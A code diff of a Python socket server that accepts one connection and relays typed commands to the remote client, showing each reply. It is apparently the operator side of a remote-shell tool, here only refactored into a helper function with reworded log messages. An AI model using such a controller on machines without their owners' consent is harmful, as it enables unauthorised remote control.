@@ -17,13 +17,13 @@ MAX_DATA_SIZE = 1024
 def socket_receive_all_data(socket_p, data_len):
     current_data_len = 0
     total_data = None
-    print(f"socket_receive_all_data len:{data_len}")
+    print(f"Socket_receive_all_data len:{data_len}")
     while current_data_len < data_len:
         chunk_len = data_len - current_data_len
         if chunk_len > MAX_DATA_SIZE:
             chunk_len = MAX_DATA_SIZE
         data = socket_p.recv(MAX_DATA_SIZE)
-        print(f"len: {len(data)}")
+        print(f"Len: {len(data)}")
         if not data:
             return None
         if not total_data:
@@ -33,6 +33,17 @@ def socket_receive_all_data(socket_p, data_len):
         current_data_len += len(data)
         print(f"Total len: {current_data_len} / {data_len}")
     return total_data
+
+def socket_send_command_and_receive_all_data(socket_p, command):
+    if not command: # if command == "" 
+        return None
+    socket_p.sendall(command.encode())
+    
+    header_data = socket_receive_all_data(socket_p, 13)
+    len_data = int(header_data.decode())
+    
+    data_receive = socket_receive_all_data(socket_p, len_data)
+    return data_receive
     
 
 s = socket.socket()
@@ -40,20 +51,17 @@ s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST_IP, HOST_PORT))
 s.listen()
 
-print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
+print(f"Wait connexion on {HOST_IP}, port {HOST_PORT}...")
 connection_socket, client_address = s.accept()
-print(f"Connexion établie avec {client_address}")
+print(f"Connexion ON : {client_address}")
 
 while True:
-    commande = input("Commande: ")
-    if commande == "":
-        continue
-    connection_socket.sendall(commande.encode())
+    data_details = socket_send_command_and_receive_all_data(connection_socket, "infos")
+    if not data_details:
+        break
+    command = input(client_address[0]+":"+str(client_address[1]) + " " + data_details.decode() + " > ")
     
-    header_data = socket_receive_all_data(connection_socket, 13)
-    len_data = int(header_data.decode())
-    
-    data_receive = socket_receive_all_data(connection_socket, len_data)
+    data_receive = socket_send_command_and_receive_all_data(connection_socket, command)
     
     if not data_receive:
         break
